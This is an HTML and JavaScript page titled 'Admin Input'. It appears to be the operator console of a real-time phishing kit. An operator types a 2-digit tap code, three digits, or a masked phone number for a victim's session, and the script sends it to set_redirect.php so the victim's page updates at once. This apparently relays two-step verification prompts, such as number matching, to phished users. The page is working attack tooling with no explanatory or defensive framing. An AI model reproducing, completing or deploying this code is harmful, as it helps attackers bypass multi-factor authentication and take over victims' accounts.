<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Input</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .icon {
            font-size: 50px;
            margin-bottom: 20px;
        }
        h1 {
            color: #1a1a2e;
            margin-bottom: 10px;
            font-size: 24px;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            text-align: left;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 24px;
            text-align: center;
            letter-spacing: 4px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #4285f4;
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(66, 133, 244, 0.4);
        }
        .btn:active {
            transform: translateY(0);
        }
        .note {
            margin-top: 20px;
            color: #888;
            font-size: 12px;
        }
        .success {
            display: none;
            color: #34a853;
            font-size: 18px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon" id="icon">👆</div>
        <h1 id="title">Enter Tap Code</h1>
        <p class="subtitle" id="subtitle">Enter the 2-digit code (00-99) to show to the user</p>
        
        <form id="inputForm">
            <div class="form-group">
                <label id="inputLabel">Tap Code (00-99)</label>
                <input type="text" id="codeInput" maxlength="2" pattern="[0-9]{1,2}" placeholder="72" required>
            </div>
            <button type="submit" class="btn" id="submitBtn">Send to User</button>
        </form>
        
        <div class="success" id="successMsg">
            ✅ Code sent! User will see it now.
        </div>
        
        <p class="note">The user's page will automatically update with this code.</p>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session_id') || '';
        const type = urlParams.get('type') || 'tap';
        
        const icon = document.getElementById('icon');
        const title = document.getElementById('title');
        const subtitle = document.getElementById('subtitle');
        const inputLabel = document.getElementById('inputLabel');
        const codeInput = document.getElementById('codeInput');
        
        if (type === 'three') {
            icon.textContent = '🔢';
            title.textContent = 'Enter 3 Codes';
            subtitle.textContent = 'Enter three single digits separated by dashes (e.g., 6-1-9)';
            inputLabel.textContent = 'Three Codes (X-X-X)';
            codeInput.maxLength = 5;
            codeInput.placeholder = '6-1-9';
            codeInput.pattern = '[0-9]-[0-9]-[0-9]';
        } else if (type === 'phone') {
            icon.textContent = '📱';
            title.textContent = 'Show Phone Number';
            subtitle.textContent = 'Enter a masked phone number to show the user';
            inputLabel.textContent = 'Phone (e.g., ***-***-1234)';
            codeInput.maxLength = 20;
            codeInput.placeholder = '***-***-1234';
            codeInput.pattern = '.*';
        }
        
        document.getElementById('inputForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const code = codeInput.value.trim();
            
            if (!code) return;
            
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Sending...';
            
            let page = 'tap_code';
            let param = 'tap_code_value';
            
            if (type === 'three') {
                page = 'three_codes';
                param = 'three_codes_value';
            } else if (type === 'phone') {
                page = 'sms_code';
                param = 'phone_display';
            }
            
            const url = 'set_redirect.php?session_id=' + encodeURIComponent(sessionId) + 
                        '&page=' + page + 
                        '&' + param + '=' + encodeURIComponent(code);
            
            fetch(url)
                .then(response => response.text())
                .then(data => {
                    document.getElementById('inputForm').style.display = 'none';
                    document.getElementById('successMsg').style.display = 'block';
                    setTimeout(() => {
                        window.close();
                    }, 1500);
                })
                .catch(error => {
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Send to User';
                    alert('Error. Please try again.');
                });
        });
        
        codeInput.addEventListener('input', function() {
            if (type === 'tap') {
                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 2);
            } else if (type === 'three') {
                let val = this.value.replace(/[^0-9-]/g, '');
                this.value = val;
            }
        });
    </script>
</body>
</html>
